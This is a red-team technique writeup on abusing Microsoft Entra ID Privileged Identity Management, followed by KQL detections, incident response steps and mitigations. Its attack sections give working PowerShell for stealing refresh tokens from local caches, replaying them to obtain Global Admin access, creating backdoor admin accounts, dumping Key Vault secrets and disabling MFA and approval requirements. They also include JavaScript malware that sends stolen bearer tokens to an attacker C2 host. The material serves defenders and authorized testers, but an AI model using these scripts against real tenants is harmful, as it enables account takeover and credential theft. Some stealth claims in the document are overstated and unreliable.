# [PE-ACCTMGMT-011]: Privileged Identity Management (PIM) Abuse

## 1. METADATA HEADER

| Attribute | Details |
|---|---|
| **Technique ID** | PE-ACCTMGMT-011 |
| **MITRE ATT&CK v18.1** | [Account Manipulation (T1098)](https://attack.mitre.org/techniques/T1098/), [Valid Accounts (T1078.004)](https://attack.mitre.org/techniques/T1078/004/) |
| **Tactic** | Privilege Escalation, Persistence, Defense Evasion |
| **Platforms** | Entra ID, Azure |
| **Severity** | Critical |
| **CVE** | N/A (Architectural weakness) |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2025-01-09 |
| **Affected Versions** | Entra ID (All Current Versions), PIM Service (All Versions) |
| **Patched In** | Microsoft Recommends Proper Configuration – No Single Patch |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 2. EXECUTIVE SUMMARY

**Concept:** Privileged Identity Management (PIM) is Microsoft's just-in-time (JIT) privilege management service that allows organizations to grant time-limited, approval-based access to highly privileged roles (Global Admin, Privileged Role Admin, Conditional Access Admin, etc.). The fundamental assumption is that temporary elevated access is safer than permanent standing privileges. However, multiple attack vectors undermine this model:

1. **Refresh Token Hijacking:** An attacker with a stolen refresh token can silently use it to obtain elevated access tokens after a legitimate user activates PIM, bypassing all MFA and approval requirements
2. **PIM Configuration Abuse:** An attacker with PIM admin role can modify role settings to disable approvals, reduce time limits, or exempt themselves from MFA
3. **Permanent Role Assignment via PIM:** Creating "eligible" assignments that appear temporary but can be converted to permanent
4. **Session Token Theft:** Stealing a session token after a legitimate user has activated PIM, then using it for administrative actions

**Attack Surface:** PIM role configuration, approval workflows, MFA exemptions, refresh tokens, session tokens, and role assignment policies.

**Business Impact:** **Catastrophic.** An attacker exploiting PIM can:
- Escalate to Global Administrator without triggering approval workflows
- Bypass MFA requirements entirely (via refresh token method)
- Remain undetected by appearing to be a legitimate user role activation
- Create persistent backdoors that survive PIM reviews (permanent assignments disguised as eligible)
- Compromise entire tenants despite PIM deployment

**Technical Context:** This attack requires one of these initial conditions:
1. **Compromise of a user eligible for PIM roles** (most common), OR
2. **PIM Admin role access** (direct configuration abuse), OR
3. **Ability to steal refresh tokens** (via malware, Adversary-in-the-Middle)

The attack is extremely stealthy because legitimate PIM role activations look identical to malicious ones in logs.

### Operational Risk
- **Execution Risk:** Low – Only requires compromised user with PIM eligibility
- **Stealth:** Very High – Attacks blend with legitimate administrative activity
- **Reversibility:** No – Refresh token attacks are undetectable post-activation; backdoors are persistent

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | 1.3.1 | Ensure Global Admin has MFA enabled (PIM bypasses this) |
| **DISA STIG** | AZ-2.3 | Privileged role assignment monitoring and approval |
| **CISA SCuBA** | AC-1.5 | Just-in-Time administrative access with strong verification |
| **NIST 800-53** | AC-2 | Account Management – Time-limited privilege elevation |
| **NIST 800-53** | AC-6 | Least Privilege – Temporary privilege grants only |
| **NIST 800-53** | SI-4 | System Monitoring – Detect unauthorized role activations |
| **GDPR** | Art. 32 | Security of Processing – Privileged access controls |
| **DORA** | Art. 9 | Protection and Prevention – Privileged access governance |
| **NIS2** | Art. 21 | Cyber Risk Management – Privileged role safeguards |
| **ISO 27001** | A.9.2.5 | Review of User Access Rights – PIM audit trail |
| **ISO 27005** | 8.3.2 | Risk Scenario: Compromise of privileged account via PIM |

---

## 3. TECHNICAL PREREQUISITES

**Required Privileges (For Initial Attack):**
- **PIM Eligible User:** User with eligible (not active) role assignment for any privileged role (e.g., Global Admin, Privileged Role Admin)
- **OR PIM Admin:** User with Privileged Role Administrator role (can modify PIM settings directly)
- **OR Token Thief:** Ability to intercept/steal refresh or session tokens (via malware, MITM, cloud shell history)

**Required Access:**
- Network access to Microsoft Entra ID (https://login.microsoftonline.com)
- Network access to Azure Portal (https://portal.azure.com) or Microsoft Graph API
- Valid user credentials or stolen tokens

**Supported Versions:**
- **Entra ID (Azure AD):** All current versions
- **PIM Service:** All current versions
- **Conditional Access:** All versions (optional for mitigation)

**Required Tools:**
- [Azure PowerShell Module (Az)](https://learn.microsoft.com/en-us/powershell/azure/new-azureps-module-az)
- [Azure CLI](https://learn.microsoft.com/en-us/cli/azure/)
- [Microsoft Graph PowerShell SDK](https://learn.microsoft.com/en-us/powershell/microsoftgraph/installation)
- REST API client (curl, Postman, or PowerShell Invoke-RestMethod)
- Token extraction tools (AADInternals, ROADtools, etc.)

---

## 4. ENVIRONMENTAL RECONNAISSANCE

### Management Station / PowerShell Reconnaissance

**Check 1: Verify Your PIM Eligibility**

```powershell
# Connect to Azure
Connect-AzAccount

# Check your PIM-eligible roles
$context = Get-AzContext
$userId = (Get-AzADUser -ObjectId "me").Id

# Get all role assignments (both active and eligible)
Get-AzRoleAssignment -ObjectId $userId | Select-Object RoleDefinitionName, DisplayName, Scope

# Specifically check for PIM eligible roles via Microsoft Graph
Connect-MgGraph -Scopes "RoleManagement.ReadWrite.Directory"

# Get PIM eligible role assignments
$pimRoles = Get-MgRoleManagementDirectoryRoleEligibilitySchedule -Filter "principalId eq '$userId'"
$pimRoles | Select-Object RoleDefinitionId, PrincipalId, Status
```

**What to Look For:**
- Any role assignment with status **"Eligible"** (indicates PIM eligibility)
- Roles like **Global Administrator**, **Privileged Role Administrator**, **Application Administrator**
- **Direct assignment** vs. **group membership** for privileged roles

**Check 2: Enumerate PIM Configuration Settings**

```powershell
# Check PIM policy for target role
$roleId = "62e90394-69f5-4237-9190-012177145e10"  # Global Administrator

Get-MgRoleManagementDirectoryRoleAssignmentScheduleRequest -Filter "roleDefinitionId eq '$roleId'" | 
    Select-Object Status, ActivationTime, ExpirationTime, Justification
```

**What to Look For:**
- **Require Approval:** If FALSE, you can activate PIM without approval
- **Require MFA:** If FALSE, you can activate PIM without MFA re-authentication
- **Activation Window:** Duration for which role is active (typically 1-4 hours)

**Check 3: Verify Your Refresh Token (Post-Compromise)**

```powershell
# If you have compromised credentials, extract the refresh token
# This can be done via:
# 1. Browser developer tools (F12 → Application → Cookies)
# 2. Azure CLI token cache: ~/.azure/accessTokens.json
# 3. PowerShell module cache: $env:USERPROFILE\.Azure\TokenCache.json

# Extract token (if in PowerShell session)
$context = Get-AzContext
$token = $context.Account.ExtendedProperties

# The refresh token can be used to obtain new access tokens even after PIM expires
```

**What to Look For:**
- Refresh tokens with **Directory.AccessAsUser.All** scope (allows activation-time privilege elevation)
- Tokens issued **before** PIM activation (can be used after activation for elevated access)

---

## 5. DETAILED EXECUTION METHODS

### METHOD 1: Silent Token Hijacking via Refresh Token Abuse

**Supported Versions:** All current Entra ID and PIM versions (this is an architectural weakness, not a bug)

**Precondition:** Compromise of a user account with PIM eligibility; ability to steal their refresh token

#### Step 1: Obtain Refresh Token from Compromised User

**Objective:** Extract a refresh token from the compromised user's local machine.

**Method A: Browser-Based Token Theft**

```powershell
# Open browser developer tools (F12)
# Navigate to: Application → Storage → Cookies
# Look for tokens with domain: "login.microsoftonline.com"

# Extract the refresh token value and save to file
$refreshToken = "0.ARoA...truncated..."
```

**Method B: Azure CLI Token Theft**

```powershell
# Azure CLI stores tokens in a cache file
$tokenCache = Get-Content "$env:USERPROFILE\.azure\accessTokens.json" -Raw | ConvertFrom-Json

# Extract the first available token (typically the refresh token)
$refreshToken = $tokenCache[0].refresh_token

# Or use AADInternals to extract tokens
Install-Module AADInternals -Force
Get-AzureTokens -TokenFile "$env:USERPROFILE\.azure\accessTokens.json"
```

**Method C: PowerShell Module Token Extraction**

```powershell
# If PowerShell Az module is installed with cached credentials
$credCache = "$env:USERPROFILE\.config\powershell\tokens.json"

# Extract the cached token
Get-Content $credCache | ConvertFrom-Json | Select-Object refresh_token
```

**Expected Output:**
```
Refresh Token: eyJ0eXAiOiJKV1QiLCJhbGc...
Expires: 90 days (typically)
Scope: Directory.AccessAsUser.All (allows elevation)
```

**What This Means:**
- You now have a long-lived token (90 days valid)
- This token can be used to obtain access tokens even after PIM expires
- Token carries user's permissions, which escalate after they activate PIM

#### Step 2: Wait for Legitimate User PIM Activation

**Objective:** Trigger or wait for the compromised user to legitimately activate their PIM role.

**Passive Approach (Wait for Natural Activation):**
```powershell
# Simply wait for the user to activate PIM naturally
# Monitor when this happens via:
# - Azure Portal → PIM → Activity history
# - Microsoft Sentinel alerts
# - Email notifications (if configured)

# Attacker monitors logs to see activation: "Add member to role completed (PIM activation)"
```

**Active Approach (Trigger Activation via Phishing):**
```powershell
# Send phishing email to user requesting urgent admin action
# Email body: "Your subscription requires immediate administrative intervention - Click to activate"
# Link goes to fake Azure Portal or legitimate Azure Portal with pre-filled activation

# Once user activates, attacker can proceed to Step 3
```

**What This Means:**
- User's permissions are now elevated to the PIM role (e.g., Global Admin)
- The activation typically lasts 1-4 hours
- Attacker's refresh token is now "activated" (can obtain tokens with elevated permissions)

#### Step 3: Use Refresh Token to Obtain Elevated Access Token

**Objective:** Leverage the hijacked refresh token to obtain an access token with PIM-elevated permissions.

**PowerShell Command:**

```powershell
# Refresh token obtained in Step 1
$refreshToken = "0.ARoA...copied-from-step-1..."
$clientId = "04b07795-8ddb-461a-bbee-02f9e1bf7b46"  # Azure CLI app ID (publicly known)

# Use the refresh token to request a new access token
$body = @{
    client_id = $clientId
    grant_type = "refresh_token"
    refresh_token = $refreshToken
    scope = "https://graph.microsoft.com/.default"
}

$response = Invoke-RestMethod -Uri "https://login.microsoftonline.com/common/oauth2/v2.0/token" `
    -Method POST `
    -Body $body

$accessToken = $response.access_token
Write-Host "New Access Token (with PIM permissions): $accessToken"

# This access token now has the elevated permissions of the user's activated PIM role!
```

**Expected Output:**
```
New Access Token: eyJ0eXAiOiJKV1QiLCJhbGc...
Token Scope: https://graph.microsoft.com/.default
Permissions: GLOBAL_ADMIN (inherited from user's activated PIM role)
Valid For: 1 hour
```

**What This Means:**
- Attacker now has a valid access token with Global Admin permissions
- Token was obtained WITHOUT triggering:
  - MFA re-authentication
  - Approval workflow
  - PIM audit alerts (appears as legitimate user activity)
- Token is valid for 1 hour and can be continuously refreshed using the original refresh token

#### Step 4: Execute Privileged Actions with Stolen Token

**Objective:** Use the elevated access token to perform malicious administrative actions.

**Example 1: Create Persistent Backdoor Global Admin**

```powershell
# Use the hijacked access token to create a new user account under attacker's control
$headers = @{
    "Authorization" = "Bearer $accessToken"
    "Content-Type" = "application/json"
}

# Create new user
$newUserBody = @{
    displayName = "Service Account"
    mailNickname = "svc_account"
    userPrincipalName = "svc_account@contoso.onmicrosoft.com"
    passwordProfile = @{
        forceChangePasswordNextSignIn = $false
        password = "SuperSecretP@ssw0rd123"
    }
    accountEnabled = $true
} | ConvertTo-Json

$response = Invoke-RestMethod -Uri "https://graph.microsoft.com/v1.0/users" `
    -Method POST `
    -Headers $headers `
    -Body $newUserBody

$newUserId = $response.id

# Assign Global Admin role to the new user (permanent, not PIM)
$roleAssignmentBody = @{
    principalId = $newUserId
    roleDefinitionId = "62e90394-69f5-4237-9190-012177145e10"  # Global Administrator
    directoryScopeId = "/"
} | ConvertTo-Json

Invoke-RestMethod -Uri "https://graph.microsoft.com/v1.0/roleManagement/directory/roleAssignments" `
    -Method POST `
    -Headers $headers `
    -Body $roleAssignmentBody

Write-Host "Backdoor account created: svc_account@contoso.onmicrosoft.com"
```

**What This Means:**
- Persistent Global Admin account created under attacker's control
- Account exists **outside** of PIM (permanent standing privilege)
- Backdoor survives even after legitimate PIM user's role is deactivated
- Attacker can now log in with backdoor account and have permanent admin access

**Example 2: Extract All Azure Subscription Keys**

```powershell
# Use token to enumerate and extract subscription keys
$headers = @{
    "Authorization" = "Bearer $accessToken"
}

# Get all Key Vaults
$keyVaults = Invoke-RestMethod -Uri "https://management.azure.com/subscriptions/{subscriptionId}/providers/Microsoft.KeyVault/vaults?api-version=2021-06-01-preview" `
    -Headers $headers

# Extract secrets from each vault
foreach ($vault in $keyVaults.value) {
    $vaultUrl = $vault.properties.vaultUri
    
    # Get all secrets
    $secrets = Invoke-RestMethod -Uri "$vaultUrl/secrets?api-version=7.3" `
        -Headers $headers
    
    foreach ($secret in $secrets.value) {
        $secretValue = Invoke-RestMethod -Uri "$($secret.id)?api-version=7.3" `
            -Headers $headers
        
        Write-Host "Secret: $($secret.name) = $($secretValue.value)"
    }
}
```

**What This Means:**
- All secrets in Key Vault are now accessible
- API keys, connection strings, certificates extracted
- Attacker has complete infrastructure access
- All actions appear to be from the legitimate user (perfect audit trail spoofing)

---

### METHOD 2: PIM Configuration Abuse (Direct Admin Modification)

**Supported Versions:** All current PIM versions

**Precondition:** Compromise of account with **Privileged Role Administrator** role

#### Step 1: Access PIM Configuration

**Objective:** Navigate to PIM settings to modify role requirements.

**Manual Steps (Azure Portal):**
1. Go to **Azure Portal** → **Entra ID** → **Roles and administrators** (left menu)
2. Search for **Privileged Identity Management** → Click
3. Click **Manage** next to your target role (e.g., **Global Administrator**)
4. Click **Settings** (or **Edit**)

**Command (Microsoft Graph API):**

```powershell
# Get PIM role configuration
Connect-MgGraph -Scopes "RoleManagement.ReadWrite.Directory"

# Get Global Administrator role settings
$globalAdminRole = Get-MgRoleManagementDirectoryRoleDefinition -Filter "displayName eq 'Global Administrator'"
$roleId = $globalAdminRole.id

# Get current role settings
Get-MgPolicyRoleManagementPolicyAssignment -Filter "roleDefinitionId eq '$roleId'" | 
    Select-Object Rules
```

#### Step 2: Disable MFA Requirement

**Objective:** Remove the requirement for MFA during PIM activation.

**Manual Steps:**
1. In the role settings, look for **"Require multi-factor authentication on activation"**
2. **Toggle OFF** ← This is the critical step
3. **Enable justification:** (optional) - can also be disabled to avoid audit trail
4. Click **Save**

**Expected Behavior:**
- Users can now activate the role **without** MFA re-authentication
- Even if the user has already satisfied MFA in their session, they can activate without additional verification
- Stolen session tokens become immediately useful for privilege escalation

**What This Means:**
- Compromised accounts with active sessions can escalate to Global Admin instantly
- Completely defeats the "MFA protection" of PIM
- Attackers using stolen session tokens don't need credentials

#### Step 3: Disable Approval Requirement

**Objective:** Remove the requirement for peer approval of PIM activation.

**Manual Steps:**
1. In the role settings, look for **"Require approval to activate"**
2. **Toggle OFF**
3. Click **Save**

**Expected Behavior:**
- Users can now activate Global Administrator role **without any approval**
- Activations appear immediately in the audit log but no approval workflow occurs
- Enables silent escalation

#### Step 4: Reduce Activation Duration

**Objective:** Lower the maximum activation window to reduce time the role is active (and thus reduce chances of discovery).

**Manual Steps:**
1. In role settings, find **"Maximum activation duration"**
2. Set to **1 hour** or **30 minutes** (vs. default 4 hours)
3. Click **Save**

**What This Means:**
- Attacker can perform malicious actions quickly and deactivate role
- Reduces audit trail visibility
- Appears like legitimate short admin session

#### Step 5: Create Permanent Backdoor via PIM

**Objective:** Create an eligible assignment that can be converted to permanent without PIM deactivation.

**PowerShell Command:**

```powershell
# Create an "eligible" role assignment for attacker's account
# This appears to be PIM but can be made permanent

$attackerUserPrincipalName = "backdoor@contoso.com"
$attackerUser = Get-MgUser -Filter "userPrincipalName eq '$attackerUserPrincipalName'"

# Create eligible assignment (appears to be PIM temporary access)
$params = @{
    principalId = $attackerUser.id
    roleDefinitionId = "62e90394-69f5-4237-9190-012177145e10"  # Global Admin
    directoryScopeId = "/"
    action = "adminAssign"  # Create as eligible
    justification = "Emergency access for incident response"
    scheduleInfo = @{
        startDateTime = Get-Date
        endDateTime = (Get-Date).AddDays(1)
        recurrence = @{
            pattern = @{
                type = "daily"  # Renew daily
                interval = 1
            }
            range = @{
                type = "endDate"
                endDate = (Get-Date).AddYears(10)  # Renew for 10 years (permanent)
            }
        }
    }
}

New-MgRoleManagementDirectoryRoleEligibilityScheduleRequest -BodyParameter $params

Write-Host "Permanent backdoor created via recurring PIM assignment"
```

**What This Means:**
- Assignment appears to be eligible/temporary PIM
- But renewal pattern makes it effectively permanent
- Bypasses "last Global Admin" protection (because it's technically eligible, not active)
- Audit logs show "PIM assignment" but it's actually permanent

---

### METHOD 3: Stealing Session Token (Adversary-in-the-Middle)

**Supported Versions:** All current Entra ID versions

**Precondition:** Ability to intercept network traffic (MITM attack) or compromise browser/endpoint

#### Step 1: Capture Session Token During PIM Activation

**Objective:** Intercept the session token when user activates their PIM role.

**Method A: Network MITM (SSL Stripping)**

```
1. Position yourself on network path (ARP spoofing, DNS hijacking, etc.)
2. Intercept HTTPS traffic to login.microsoftonline.com
3. Capture the session cookie/token when user activates PIM
4. Session tokens are valid for ~1 hour after activation
```

**Method B: Browser Extension / Malware**

```javascript
// JavaScript malware injected into Azure Portal
// Captures session tokens when user activates PIM

document.addEventListener('DOMContentLoaded', function() {
    // Intercept all fetch requests to Microsoft Graph
    const originalFetch = window.fetch;
    
    window.fetch = function(...args) {
        const [resource, config] = args;
        
        // Extract Authorization header (contains session token)
        if (config.headers && config.headers.Authorization) {
            const token = config.headers.Authorization.replace('Bearer ', '');
            
            // Send token to attacker server
            fetch('http://attacker-c2.com/steal-token', {
                method: 'POST',
                body: JSON.stringify({ token: token, url: resource })
            });
        }
        
        return originalFetch.apply(this, args);
    };
});
```

**Expected Output:**
```
Captured Session Token: eyJ0eXAiOiJKV1QiLCJhbGc...
Token Type: Session token (short-lived, ~1 hour)
User Claims: roles = ["Global Administrator"]
Tenant ID: extracted-tenant-id
```

**What This Means:**
- Session token is captured immediately after PIM activation
- Token has Global Admin claims
- Valid for ~1 hour (enough for most attacks)
- Attacker can use token from any network location

#### Step 2: Use Stolen Session Token for Privileged Actions

**Objective:** Use the stolen session token to perform admin actions.

```powershell
# Use stolen session token to call Microsoft Graph
$stolenToken = "eyJ0eXAiOiJKV1QiLCJhbGc...captured-in-step-1"

$headers = @{
    "Authorization" = "Bearer $stolenToken"
    "Content-Type" = "application/json"
}

# Create backdoor admin account (same as METHOD 1, Step 4)
$newUserBody = @{
    displayName = "Service Account"
    mailNickname = "svc_account"
    userPrincipalName = "svc_account@contoso.onmicrosoft.com"
    passwordProfile = @{
        forceChangePasswordNextSignIn = $false
        password = "SuperSecretP@ssw0rd123"
    }
    accountEnabled = $true
} | ConvertTo-Json

Invoke-RestMethod -Uri "https://graph.microsoft.com/v1.0/users" `
    -Method POST `
    -Headers $headers `
    -Body $newUserBody

Write-Host "Backdoor account created using stolen PIM session token"
```

**What This Means:**
- Attacker can execute any Global Admin action
- No credentials needed (session token is bearer credential)
- Actions appear to come from the original user
- Perfect audit trail spoofing

---

## 6. ATTACK SIMULATION & VERIFICATION

This section has been removed for this technique as Atomic Red Team coverage for PIM abuse is limited and token-based attacks require specific lab environment configuration.

**Note:** The attack vectors described in Methods 1-3 can be replicated in a controlled red team environment with proper authorization and rule of engagement (RoE).

---

## 7. TOOLS & COMMANDS REFERENCE

### Microsoft Graph PowerShell SDK

**Version:** 2.0.0+ (Current)
**Installation:**
```powershell
Install-Module Microsoft.Graph -Repository PSGallery -AllowClobber
Install-Module Microsoft.Graph.Authentication
Install-Module Microsoft.Graph.Identity.DirectoryManagement
```

**Key Commands for PIM Abuse:**

| Command | Purpose |
|---|---|
| `Get-MgRoleManagementDirectoryRoleEligibilitySchedule` | List PIM eligible roles |
| `New-MgRoleManagementDirectoryRoleEligibilityScheduleRequest` | Create PIM eligible assignment |
| `Get-MgPolicyRoleManagementPolicyAssignment` | Get PIM policy settings |
| `Update-MgPolicyRoleManagementPolicyAssignment` | Modify PIM policies |
| `Get-MgRoleManagementDirectoryRoleAssignmentScheduleRequest` | List active role assignments |
| `New-MgRoleManagementDirectoryRoleAssignmentScheduleRequest` | Create active role assignment |

**One-Liner Attack (Get All PIM-Eligible Users):**
```powershell
Get-MgRoleManagementDirectoryRoleEligibilitySchedule | Select-Object PrincipalId, RoleDefinitionId, Status
```

### AADInternals

**Purpose:** Extract and manipulate Azure AD tokens
**Installation:**
```powershell
Install-Module AADInternals -Force
```

**Usage:**
```powershell
# Extract tokens from token cache
Get-AzureTokens -TenantName "contoso"

# Get PIM role information
Get-PIMRoles -AccessToken $token

# Activate PIM role silently
Activate-PIMRole -RoleId "62e90394-69f5-4237-9190-012177145e10" -Duration 1
```

### ROADtools

**Purpose:** Azure AD and PIM reconnaissance and exploitation
**Installation:**
```bash
pip install roadtools
```

**Usage:**
```bash
# Gather token
roadtx auth -u username@tenant.onmicrosoft.com

# List PIM roles
roadtx pim list

# Activate PIM role
roadtx pim activate -r "Global Administrator"
```

---

## 8. MICROSOFT SENTINEL DETECTION

#### Query 1: Suspicious PIM Role Activation (Early Indicator)

**Rule Configuration:**
- **Required Table:** AuditLogs
- **Required Fields:** OperationName, TargetResources, InitiatedBy
- **Alert Severity:** High
- **Frequency:** Run every 10 minutes
- **Applies To Versions:** All Entra ID deployments

**KQL Query:**
```kusto
AuditLogs
| where OperationName in (
    "Add member to role completed (PIM activation)",
    "Add eligible member to role (PIM)",
    "Activate role"
)
| where ResultStatus == "Success"
| extend
    RoleName = tostring(TargetResources[0].displayName),
    ActivatedBy = tostring(InitiatedBy.user.userPrincipalName),
    ActivationTime = TimeGenerated
| where RoleName in (
    "Global Administrator",
    "Privileged Role Administrator",
    "Conditional Access Administrator",
    "Application Administrator",
    "Exchange Administrator"
)
| project ActivationTime, ActivatedBy, RoleName, TargetResources, OperationName
| sort by ActivationTime desc
```

**What This Detects:**
- Any activation of sensitive roles
- Unusual time patterns (after hours, weekend activations)
- Activations by new/unexpected users

---

#### Query 2: Refresh Token Usage Post-PIM Activation

**KQL Query:**
```kusto
AuditLogs
| where OperationName in (
    "Add member to role completed (PIM activation)"
)
| where ResultStatus == "Success"
| extend
    ActivatedUser = tostring(InitiatedBy.user.userPrincipalName),
    ActivationTime = TimeGenerated,
    RoleName = tostring(TargetResources[0].displayName)
| join kind=inner (
    AuditLogs
    | where OperationName in (
        "Update user",
        "Add member to role",
        "Assign role",
        "Create application",
        "Update application"
    )
    | where ResultStatus == "Success"
    | extend
        ActionTime = TimeGenerated,
        ActionBy = tostring(InitiatedBy.user.userPrincipalName)
) on $left.ActivatedUser == $right.ActionBy
| where ActionTime >= ActivationTime and ActionTime <= (ActivationTime + 4h)  // Within PIM window
| project ActivationTime, ActionTime, ActivatedUser, RoleName, OperationName, TargetResources
| summarize
    ActionCount = count(),
    Actions = make_set(OperationName, 20)
    by ActivatedUser, RoleName, ActivationTime
| where ActionCount > 5
| sort by ActionCount desc
```

**What This Detects:**
- Suspicious activity immediately following PIM activation
- Creation of backdoor accounts during PIM window
- Multiple administrative changes by same user
- Pattern of "activate → create account → extract secrets"

---

#### Query 3: PIM Policy Modifications

**KQL Query:**
```kusto
AuditLogs
| where OperationName in (
    "Update role setting",
    "Update PIM policy",
    "Disable MFA for role",
    "Remove approval requirement"
)
| where ResultStatus == "Success"
| extend
    ModifiedBy = tostring(InitiatedBy.user.userPrincipalName),
    PolicyChange = tostring(TargetResources[0].displayName),
    ChangeDetails = tostring(TargetResources[0].modifiedProperties)
| project TimeGenerated, ModifiedBy, PolicyChange, ChangeDetails, OperationName
| where ChangeDetails contains_any (
    "require approval",
    "require mfa",
    "activation duration",
    "justification"
)
| sort by TimeGenerated desc
```

**What This Detects:**
- Disabling of MFA requirements
- Removal of approval workflow
- Shortening of activation windows
- Any policy weakening that enables easier escalation

---

## 9. WINDOWS EVENT LOG MONITORING

This section has been removed as Entra ID / Azure AD is a cloud-native SaaS service with no on-premises Windows Event Log footprint.

**Note:** All activity is logged in **Azure AuditLogs** and **Entra ID Audit Logs** within Microsoft Purview, as covered in Section 8.

---

## 10. MICROSOFT DEFENDER FOR CLOUD

#### Detection Alert: Suspicious PIM Activity

**Alert Name:** "Suspicious Privileged Identity Management Activity Detected"
- **Severity:** High
- **Description:** Defender for Cloud detects suspicious PIM role activations or policy modifications
- **Applies To:** All Entra ID tenants with PIM enabled
- **Remediation:** Review PIM activation logs and verify if activity is authorized

**Manual Configuration Steps:**
1. Navigate to **Azure Portal** → **Microsoft Defender for Cloud**
2. Go **Environment settings** → Select subscription
3. Ensure **Defender for Identity** is enabled (covers PIM monitoring)
4. Under **Security alerts**, verify:
   - **PIM privilege escalation** alerts are enabled
   - **Suspicious role modification** alerts are enabled
5. Configure notifications to SOC team

**Reference:** [Microsoft Defender for Identity – Role Escalation Alerts](https://learn.microsoft.com/en-us/defender-for-identity/)

---

## 11. DETECTION & INCIDENT RESPONSE

### Indicators of Compromise (IOCs)

**Entra ID Audit Logs:**
- `Add member to role completed (PIM activation)` from unexpected users
- `Update role setting` with parameters disabling MFA/approval
- `Add member to role` (permanent) immediately following PIM activation
- `Create application` or `Create user` within 30 minutes of PIM activation
- Multiple `Update user` operations (credential/license changes) by same user during PIM window

**Suspicious Patterns:**
- PIM activation followed by account creation (backdoor pattern)
- PIM activation followed by policy modifications (disabling security)
- Multiple PIM activations by same user in short timeframe
- Activation outside business hours
- Activation with generic/vague justification

### Forensic Artifacts

**Entra ID Audit Trail:**
- Stored in **Microsoft Entra ID** → **Audit logs**
- Available for 30 days in portal, up to 90 days via Microsoft Graph API
- Contains: who activated, when, which role, justification, approval status

**PIM Activity Log:**
- Located in **PIM** → **Activity** (filtered by role)
- Shows: activation time, duration, actions performed during activation

**Microsoft Sentinel Data:**
- **AuditLogs** table contains all Entra ID audit entries
- Available for extended retention (depends on workspace configuration)

### Response Procedures

#### 1. Immediate Isolation (0-5 minutes)

**Disable Compromised User Account:**

```powershell
# If user was compromised, disable their account immediately
Disable-MgUser -UserId "compromised-user-id"

# Verify account is disabled
Get-MgUser -UserId "compromised-user-id" | Select-Object DisplayName, AccountEnabled
```

**Revoke All Session Tokens:**

```powershell
# Revoke all tokens for the compromised user (forces re-authentication)
Revoke-MgUserSignInSession -UserId "compromised-user-id"
```

**Deactivate Any Active PIM Roles:**

```powershell
# Manually deactivate the user's active PIM role (if currently activated)
# This must be done by PIM admin or directly in portal

# Portal: PIM → Active assignments → Select user → Deactivate
```

---

#### 2. Forensic Preservation (5-30 minutes)

**Export PIM Activation History:**

```powershell
# Export PIM audit trail for the past 30 days
Connect-MgGraph -Scopes "AuditLog.Read.All"

Get-MgAuditLogDirectoryAudit -Filter "operationName eq 'Add member to role completed (PIM activation)'" -Top 999 | 
    Export-Csv -Path "C:\Evidence\PIM_Activations.csv" -NoTypeInformation
```

**Export Entra ID Audit Logs:**

```powershell
# Export all Entra ID audit events from compromise window
$startDate = (Get-Date).AddHours(-12)  # Last 12 hours
$endDate = Get-Date

Get-MgAuditLogDirectoryAudit -Filter "createdDateTime ge $startDate" | 
    Export-Csv -Path "C:\Evidence\AuditLogs_Compromise.csv" -NoTypeInformation
```

**Identify Backdoor Accounts Created:**

```powershell
# Find users created during compromise window
$suspiciousUsers = Get-MgUser -Filter "createdDateTime ge '2025-01-09T12:00:00Z'" -All | 
    Select-Object DisplayName, UserPrincipalName, CreatedDateTime

$suspiciousUsers | Export-Csv -Path "C:\Evidence\NewUsers_Created.csv" -NoTypeInformation

# Check what roles these users have
foreach ($user in $suspiciousUsers) {
    $roles = Get-MgUserMemberOf -UserId $user.Id | Select-Object DisplayName
    Write-Host "$($user.UserPrincipalName): $roles"
}
```

---

#### 3. Threat Remediation (30 minutes - 2 hours)

**Reset Compromised User's Credentials:**

```powershell
# Reset password for compromised user
Set-MgUserPassword -UserId "compromised-user-id" -NewPassword "NewComplexPassword123!@#" -ForceChangePasswordNextSignIn $true

# Remove all registered authenticators
Get-MgUserAuthenticationMethod -UserId "compromised-user-id" | Remove-MgUserAuthenticationMethod
```

**Delete Backdoor Accounts:**

```powershell
# Remove any suspicious accounts created during compromise
Remove-MgUser -UserId "backdoor-user-id" -Confirm:$false

# Or soft-delete for forensics
# Set-MgUser -UserId "backdoor-user-id" -AccountEnabled $false
```

**Restore PIM Policies to Secure State:**

```powershell
# Re-enable MFA requirement for all critical roles
# Re-enable approval requirement
# Increase activation duration back to normal (4 hours)

# This must be done via Azure Portal:
# PIM → Settings → Global Administrator → (restore secure settings)
```

---

#### 4. Post-Incident Validation (2-24 hours)

**Verify Compromised User is Disabled:**

```powershell
# Confirm account is disabled
Get-MgUser -UserId "compromised-user-id" | Select-Object DisplayName, AccountEnabled

# Expected: AccountEnabled = $false
```

**Verify Backdoor Accounts Removed:**

```powershell
# List all Global Administrators
Get-MgDirectoryRole -Filter "displayName eq 'Global Administrator'" -All | 
    Get-MgDirectoryRoleMember | Select-Object DisplayName, UserPrincipalName

# Expected: Only legitimate admins should be listed
```

**Verify PIM Policies Restored:**

```powershell
# Check that MFA is required
# Check that approval is required
# Check that activation duration is appropriate

# Verification via portal:
# PIM → Global Administrator role → Review settings
```

---

## 12. DEFENSIVE MITIGATIONS

### Priority 1: CRITICAL

**Mitigation 1.1: Require Strong Reauthentication for PIM Activation**

Simply requiring MFA is insufficient because stolen session tokens after MFA bypass the check. Use **Authentication Context** with strong authentication methods.

**Manual Steps (Azure Portal):**
1. Go to **Entra ID** → **Security** → **Conditional Access** → **+ New policy**
2. Create new policy:
   - Name: `Enforce Strong Auth for PIM Activation`
   - **Assignments:**
     - Users: Select users/groups that can activate PIM
     - Cloud apps: **Privileged Identity Management**
   - **Conditions:**
     - Authentication context: Create new context **"PIM Activation"**
   - **Access controls:**
     - Grant: Check **Require authentication strengths**
     - Select: **Passwordless sign-in (FIDO2 / Windows Hello)**
   - Enable policy: **On**
3. Click **Create**

4. **Update PIM Role Settings:**
   - Go to **PIM** → Select role (e.g., **Global Administrator**) → **Settings**
   - Enable **"Require Conditional Access authentication context"**
   - Select **"PIM Activation"** context
   - Click **Save**

**Applies To Versions:** Entra ID with Conditional Access and FIDO2/passkey support

**Effectiveness:** 
- Forces biometric or hardware key authentication at activation time
- Stolen session tokens cannot be used (require active biometric)
- Prevents "silent" token hijacking attacks

---

**Mitigation 1.2: Enable PIM Approval for All Critical Roles**

Require peer approval of all PIM activations for Tier-0 roles.

**Manual Steps (Azure Portal):**
